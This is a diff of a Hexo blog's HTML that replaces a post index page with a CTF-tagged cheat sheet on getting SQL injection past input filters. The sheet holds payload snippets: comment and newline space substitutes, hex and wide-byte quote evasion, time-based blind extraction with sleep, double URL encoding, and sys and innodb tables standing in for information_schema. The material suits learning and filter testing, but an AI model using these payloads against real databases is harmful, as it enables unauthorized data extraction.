@@ -21,17 +21,26 @@
     <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="https://hackerqwq.github.io/page/4/index.html">
+    <meta name="description" content="空格过滤注释符12&#x2F;**&#x2F;&#x2F;!**&#x2F; 双空格%20%20 回车绕过ascii码为chr(13)&amp;chr(10)，url编码为%0d%0a 括号绕过1select(user())from dual where(1&#x3D;1)and(2&#x3D;2)  引号过滤使用十六进制1select column_name  from information_schema.tables where table_name">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql绕过过滤速查">
+<meta property="og:url" content="https://hackerqwq.github.io/2021/04/08/sql%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E9%80%9F%E6%9F%A5/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="空格过滤注释符12&#x2F;**&#x2F;&#x2F;!**&#x2F; 双空格%20%20 回车绕过ascii码为chr(13)&amp;chr(10)，url编码为%0d%0a 括号绕过1select(user())from dual where(1&#x3D;1)and(2&#x3D;2)  引号过滤使用十六进制1select column_name  from information_schema.tables where table_name">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210408115148.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210408115222.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210408115243.png">
+<meta property="article:published_time" content="2021-04-08T03:55:16.000Z">
+<meta property="article:modified_time" content="2021-04-08T03:55:36.207Z">
 <meta property="article:author" content="HacKerQWQ">
+<meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210408115148.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
-    <title>HacKerQWQ&#39;s Studio</title>
+    <title>sql绕过过滤速查 · HacKerQWQ&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -86,6 +95,8 @@
 
     <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -210,14 +221,23 @@
 <meta name="generator" content="Hexo 5.2.0"></head>
 
     
-        <body class="home-body">
+        <body class="post-body">
     
     
-<header class="header index-header">
+<header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >HacKerQWQ&#39;s Studio.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">sql绕过过滤速查</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>HacKerQWQ's Studio.</a>
 </header>
@@ -236,17 +256,17 @@ height:50vh;
     <!-- 主页  -->
     
     
-    <!-- 文章页  -->
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/index-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            HacKerQWQ's Studio.
-            <!-- 文章页  -->
+            sql绕过过滤速查
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
@@ -254,12 +274,49 @@ height:50vh;
             <!-- 主页副标题  -->
             
             
-                You do things when the opportunities come along.
-            
-            <!-- 文章页  -->
+            <!-- 404 -->
             
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">742</span>Reading time: <span class="post-count reading-time">3 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/04/08</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -360,448 +417,111 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/10/14/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/" >
             
-                <span>变量覆盖漏洞</span>
-        </a>
-        <div class="abstract-content">
-            引子先看一段php代码
-123456&lt;?php$a = &quot;aa&quot;;$aa = &quot;111111&quot;;echo &quot;aa变量的值为&quot;.$aa;$$a = $_GET[&#x27;name&#x27;];echo &quot;aa变量的值为&quot;.$aa;
-通过url传入name变量为555之后结果：解析：这里由于$$a=$($a)=$aa，因此赋值时将name的值赋值给了$aa,造成了变量覆盖漏洞
-register_globals(全局变量覆盖)register_globals是php.ini中的一个选项，从PHP 5.3....
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/10/14</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/10/13/SQL%E8%AF%AD%E5%8F%A5%E4%B9%8B%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" >
-            
-                <span>SQL语句之增删改查及用户权限</span>
-        </a>
-        <div class="abstract-content">
-            什么是SQLSQL(发音为S-Q-L或sequel)是Structured Query Language(结构化查询语言)的缩写，是一种专门用来与数据库沟通的语言。
-检索(查)初步检索
-单个列的检索12SELECT prod_name FROM Products;
-从Products表中获取prod_name列的信息
-多个列的检索12SELECT prod_name,prod_id,prod_priceFROM Products;
-从Products中获取prod_name,prod_id,prod_price等列的信息
-检索所有列12SELECT *FROM Products;
-给定通...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/10/13</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "MySQL">MySQL</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/10/13/%E9%9B%B6%E5%AE%BD%E5%BA%A6%E5%AD%97%E7%AC%A6%E9%9A%90%E5%86%99/" >
-            
-                <span>零宽度字符隐写</span>
-        </a>
-        <div class="abstract-content">
-            零宽度字符是什么零宽度字符是一些不可见的，不可打印的字符。它们存在于页面中主要用于调整字符的显示格式，下面就是一些常见的零宽度字符及它们的unicode码和原本用途：
+<main class="main post-page">
+    <article class="article-entry">
+        <h1 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h1><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span></span><br><span class="line">/!**/</span><br></pre></td></tr></table></figure>
+<h2 id="双空格"><a href="#双空格" class="headerlink" title="双空格"></a>双空格</h2><p>%20%20</p>
+<h2 id="回车绕过"><a href="#回车绕过" class="headerlink" title="回车绕过"></a>回车绕过</h2><p>ascii码为chr(13)&amp;chr(10)，url编码为%0d%0a</p>
+<h2 id="括号绕过"><a href="#括号绕过" class="headerlink" title="括号绕过"></a>括号绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="keyword">user</span>())<span class="keyword">from</span> dual <span class="keyword">where</span>(<span class="number">1</span>=<span class="number">1</span>)<span class="keyword">and</span>(<span class="number">2</span>=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
 
-零宽度空格符 (zero-width space) U+200B : 用于较长单词的换行分隔
-零宽度非断空格符 (zero width no-break space) U+FEFF : 用于阻止特定位置的换行分隔
-零宽度连字符 (zero-width joiner) U+200D : 用于阿拉伯文与印度语系等文字中，使不会发生连字的字符间产生连字效果
-零宽度断字符 (zero-width non-joiner) U+20...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/10/13</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/10/12/htaccess%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" >
-            
-                <span>.htaccess的漏洞利用总结</span>
-        </a>
-        <div class="abstract-content">
-            .htaccess简介.htaccess全称Hypertext Access(超文本入口)，也叫分布式配置文件，在一个特定的目录放置一个.htaccess可以作用于此目录及其子目录
-如果开启.htaccess，可以在所在文件夹和子文件下改变php.ini的配置。对于黑客来说，如果能控制.htaccess，就可以完成绕WAF、文件包含、文件上传等操作
-.htaccess利用方法(前提条件)首先目标主机必须开启.htaccess，配置在apache2.conf中，这里是部分配置
-123456789101112131415161718192021222324252627282930313233...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/10/12</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/10/10/Private-Key-Encryption-1/" >
-            
-                <span>Private-Key Encryption(1)</span>
-        </a>
-        <div class="abstract-content">
-            Principles of Modern CryptographyFormal Definitions(正式的定义)If you don’t understand what you want to achieve, how can you possibly know when (or if) you have achieved it?如果你不知道你想要的做到怎样，那你怎么知道你做到了没有
+<h1 id="引号过滤"><a href="#引号过滤" class="headerlink" title="引号过滤"></a>引号过滤</h1><h2 id="使用十六进制"><a href="#使用十六进制" class="headerlink" title="使用十六进制"></a>使用十六进制</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name  <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name=<span class="number">0x7573657273</span></span><br></pre></td></tr></table></figure>
+<h2 id="宽字符"><a href="#宽字符" class="headerlink" title="宽字符"></a>宽字符</h2><p>数据库使用gbk编码时可以用宽字符<br>%df%27 %bf%27 %aa%27</p>
+<h1 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h1><h2 id="使用from"><a href="#使用from" class="headerlink" title="使用from"></a>使用from</h2><p>from：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="offset"><a href="#offset" class="headerlink" title="offset"></a>offset</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="comment"># 等价于下面这条SQL语句</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<h2 id="join"><a href="#join" class="headerlink" title="join"></a>join</h2><p>原语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+<p>join 语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="case-when"><a href="#case-when" class="headerlink" title="case when"></a>case when</h2><p>case when #condition then … else … end语句来代替if语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">case when ord(substr((<span class="keyword">select</span> username <span class="keyword">from</span> db.table <span class="keyword">limit</span> <span class="number">1</span>) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>))=<span class="number">98</span> <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">2</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span></span><br></pre></td></tr></table></figure>
 
-what security guarantees are desired(要达到怎样的安全)
+<h1 id="比较号过滤-lt-gt"><a href="#比较号过滤-lt-gt" class="headerlink" title="比较号过滤(&lt;&gt;)"></a>比较号过滤(&lt;&gt;)</h1><h2 id="使用greatest"><a href="#使用greatest" class="headerlink" title="使用greatest"></a>使用greatest</h2><p>用法：greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">greatest</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)=<span class="number">64</span></span><br><span class="line"><span class="comment">#等价于</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>))&gt;<span class="number">64</span></span><br></pre></td></tr></table></figure>
+<h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h2><p>strcmp(str1,str2)<br>当str1=str2，返回0，当str1&gt;str2，返回1，当str1&lt;str2，返回-1</p>
+<h2 id="in-操作符"><a href="#in-操作符" class="headerlink" title="in 操作符"></a>in 操作符</h2><h2 id="between-and"><a href="#between-and" class="headerlink" title="between   and"></a>between   and</h2><p>选取介于两个值之间的数据范围。这些值可以是数值、文本或者日期。</p>
+<h1 id="等号过滤"><a href="#等号过滤" class="headerlink" title="等号过滤"></a>等号过滤</h1><h2 id="regexp-amp-rlike-amp-like"><a href="#regexp-amp-rlike-amp-like" class="headerlink" title="regexp&amp;rlike&amp;like"></a>regexp&amp;rlike&amp;like</h2><p>不加通配符的like执行的效果和=一致，所以可以用来绕过；</p>
+<p>rlike的用法和上面的like一样，没有通配符效果和=一样；</p>
+<p>regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</p>
+<p>&lt;&gt; 等价于 !=  ，所以在前面再加一个!结果就是等号了</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1 or 1 like 1</span><br><span class="line">?id=1 or 1 rlike 1</span><br><span class="line">?id=1 or 1 regexp 1</span><br><span class="line">?id=1 or !(1 &lt;&gt; 1)或者1 !(&lt;&gt;) 1</span><br></pre></td></tr></table></figure>
 
-No recover the key (不能恢复出密钥)No recover any character...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/10/10</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Crypto">Crypto</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/10/10/Perfectly-Secret-Encryption/" >
-            
-                <span>Perfectly Secret Encryption</span>
-        </a>
-        <div class="abstract-content">
-            Perfect Secrecy(完全保密)Outline
-Basic Probability Theory(基本概率论)
-Conditional probability(传统概率论)Total probability formula(全概率公式)Baye’s formula(贝叶斯公式)
+<h1 id="or-and过滤"><a href="#or-and过滤" class="headerlink" title="or/and过滤"></a>or/and过滤</h1><p>and = &amp;&amp;<br>or = ||</p>
+<h1 id="过滤函数"><a href="#过滤函数" class="headerlink" title="过滤函数"></a>过滤函数</h1><h2 id="替代"><a href="#替代" class="headerlink" title="替代"></a>替代</h2><p>hex()、bin() ==&gt; ascii()<br>mid()、substr(),left() ==&gt; substring()<br>sleep=&gt;benchmark(1)<br>group_concat=&gt;concat_ws()</p>
+<h1 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h1><h2 id="双url编码"><a href="#双url编码" class="headerlink" title="双url编码"></a>双url编码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1+and+1&#x3D;2</span><br><span class="line">1+%25%36%31%25%36%65%25%36%34+1&#x3D;2 </span><br></pre></td></tr></table></figure>
+<h2 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h2><p>适用于MYSQL数据库<br>and /*!select*/ 1,2</p>
+<h2 id="双写"><a href="#双写" class="headerlink" title="双写"></a>双写</h2><p>selselectect</p>
+<h2 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h2><p>SeLect</p>
+<h2 id="unicode对部分符号绕过"><a href="#unicode对部分符号绕过" class="headerlink" title="unicode对部分符号绕过"></a>unicode对部分符号绕过</h2><p>单引号=&gt; %u0037 %u02b9<br>空格=&gt; %u0020 %uff00<br>左括号=&gt; %u0028 %uff08<br>右括号=&gt; %u0029 %uff09</p>
+<h1 id="if过滤"><a href="#if过滤" class="headerlink" title="if过滤"></a>if过滤</h1><h2 id="case-when-1"><a href="#case-when-1" class="headerlink" title="case when"></a>case when</h2><p>case when #condition then … else … end语句来代替if语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">case when ord(substr((<span class="keyword">select</span> username <span class="keyword">from</span> db.table <span class="keyword">limit</span> <span class="number">1</span>) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>))=<span class="number">98</span> <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">2</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span></span><br></pre></td></tr></table></figure>
 
+<h1 id="information-schema过滤"><a href="#information-schema过滤" class="headerlink" title="information_schema过滤"></a>information_schema过滤</h1><h2 id="mysql5-7新增sys-schema-auto-increment-columns"><a href="#mysql5-7新增sys-schema-auto-increment-columns" class="headerlink" title="mysql5.7新增sys.schema_auto_increment_columns"></a>mysql5.7新增sys.schema_auto_increment_columns</h2><p>这是sys数据库下的一个视图，基础数据来自与information_schema,他的作用是对表的自增ID进行监控，也就是说，如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210408115148.png" alt="20210408115148"></p>
+<h2 id="sys-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer</h2><p>这是sys数据库下的视图，里面存储着所有数据库所有表的统计信息</p>
+<p>与它表结构相似的视图还有</p>
+<ul>
+<li><p>sys.x$schema_table_statistics_with_buffer</p>
+</li>
+<li><p>sys.x$schema_table_statistics</p>
+</li>
+<li><p>sys.x$ps_schema_table_statistics_io</p>
+</li>
+</ul>
+<p>以下为该视图的常用列（全部列有很多很多）<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210408115222.png" alt="20210408115222"></p>
+<h2 id="mysql默认存储引擎innoDB携带的表"><a href="#mysql默认存储引擎innoDB携带的表" class="headerlink" title="mysql默认存储引擎innoDB携带的表"></a>mysql默认存储引擎innoDB携带的表</h2><ul>
+<li><p>mysql.innodb_table_stats</p>
+</li>
+<li><p>mysql.innodb_index_stats</p>
+</li>
+</ul>
+<p>两表均有<code>database_name</code>和<code>table_name</code>字段，可以利用<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210408115243.png" alt="20210408115243"></p>
 
-
-
-ℳ:  Message space    M    m
-𝒦:  Key space               K     k
-𝒞:  Ciphertext space   C     c
-
-Definitionciphertext reveals nothing about the und...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/10/10</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Crypto">Crypto</a>
-    
-</div>
-            
-        </div>
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/10/10/Hash%E5%87%BD%E6%95%B0%E7%9A%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" >
-            
-                <span>Hash函数的相关知识</span>
-        </a>
-        <div class="abstract-content">
-            Hash基本概念Hash也就是我们俗称的哈希，也叫”散列”,意思是“混杂、拼凑、杂乱”Hash其实可以看做是排序的一种相反的操作，排序是按照某种规则将元素排列起来，而散列通过计算哈希值将元素之间的关系打破，形成新的序列
-Hash的作用Hash 算法的原理是试图将一个空间的数据集映射到另外一个空间（通常比原空间要小），并利用质数将数据集能够均匀的映射。Hash通过计算大幅度缩小查找范围，比直接从全部数据里面查找速度更快
-Hash的特点
-免碰撞：即不会出现输入 x≠y ，但是H(x)=H(y) 的情况，其实这个特点在理论上并不成立，比如目前比特币使用的 SHA256 算法，会有 2^256 ...
+        <div class="license-wrapper">
+            <p>Author：<a href="https://hackerqwq.github.io">HacKerQWQ</a>
+            <p>原文链接：<a href="https://hackerqwq.github.io/2021/04/08/sql%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E9%80%9F%E6%9F%A5/">https://hackerqwq.github.io/2021/04/08/sql%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E9%80%9F%E6%9F%A5/</a>
+            <p>发表日期：<a href="https://hackerqwq.github.io/2021/04/08/sql%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E9%80%9F%E6%9F%A5/">April 8th 2021, 11:55:16 am</a>
+            <p>更新日期：<a href="https://hackerqwq.github.io/2021/04/08/sql%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E9%80%9F%E6%9F%A5/">April 8th 2021, 11:55:36 am</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/10/10</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Crypto">Crypto</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/10/10/CRC%E5%86%97%E4%BD%99%E7%A0%81%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" >
-            
-                <span>CRC冗余码相关知识</span>
-        </a>
-        <div class="abstract-content">
-            CRC校验基本原理CRC校验码就是一个m长的二进制信息序列加上n长的二进制校验序列，形成的m+n长的CRC冗余码。当n长的信息序列在传递过程中发生错误时，由于信息序列与校验序列在传递前存在某种关联，因此可以凭借这种关联将错误位矫正，这就是CRC校验码
-实现信息发送方和接收方事先约定了一个生成多项式g(x)V(x)=A(x)g(x)=xn*m(x)+r(x)其中m(x)为信息多项式，r(x)为n-1次的校验多项式，xn代表x的n次方r(x)的计算方法为：在K位信息字段的后面添加n个0，再除以g ( x )对应的代码序列，得到的余数即为r ( x )对应的代码(应为n－1位；若不足，而在高位...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/10/10</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Crypto">Crypto</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/09/26/CRC32%E7%A2%B0%E6%92%9E%E6%81%A2%E5%A4%8Dpng/" >
-            
-                <span>CRC32碰撞恢复png(含png块的知识)</span>
-        </a>
-        <div class="abstract-content">
-            png块的基本知识前八个字节表示这是一个png文件，然后接着的四个字节表示数据块长度，最后四个字节表示数据块类型码，比如这里的IHDR类型码
-文件署名域8字节的PNG文件署名域用来识别该文件是不是PNG文件。该域的值是：|十进制数|十六进制数||:-:|:-:||137|89||80|50||78|4e||71|47||13|0d||10|0a||26|1a||10|0a|
-数据块数据块分为关键数据块(critical chunk)**和辅助数据块(ancillary chunks)。每个数据块都由下表所示的4个域组成|名称|字节数|说明||:–:|:–:|:–||Length(长度)|...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/09/26</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Reverse-it-xxd%E3%80%81tr%E3%80%81rev%E5%91%BD%E4%BB%A4/" >
-            
-                <span>攻防世界-Reverse-it(xxd、tr、rev命令)</span>
-        </a>
-        <div class="abstract-content">
-            题目附件下载下来binwalk识别了一下只是单纯的data文件，win下用HXD查看也没什么头绪想到题目Reverse it，再看看文件的十六进制结尾FF 8D FF，反过来就是FF D8 FF也就是jpg格式文件的十六进制开头所以这题的思路就很明确了，就是将文件的十六进制反过来
-解题Linux下命令的了解xxd(https://www.cnblogs.com/kwliu/p/3709707.html)tr(http://blog.sina.com.cn/s/blog_58c3f7960100uttl.html)rev(https://man.linuxde.net/rev)
-思路这里我...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/09/10</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
-    
-    <nav class="page-nav">
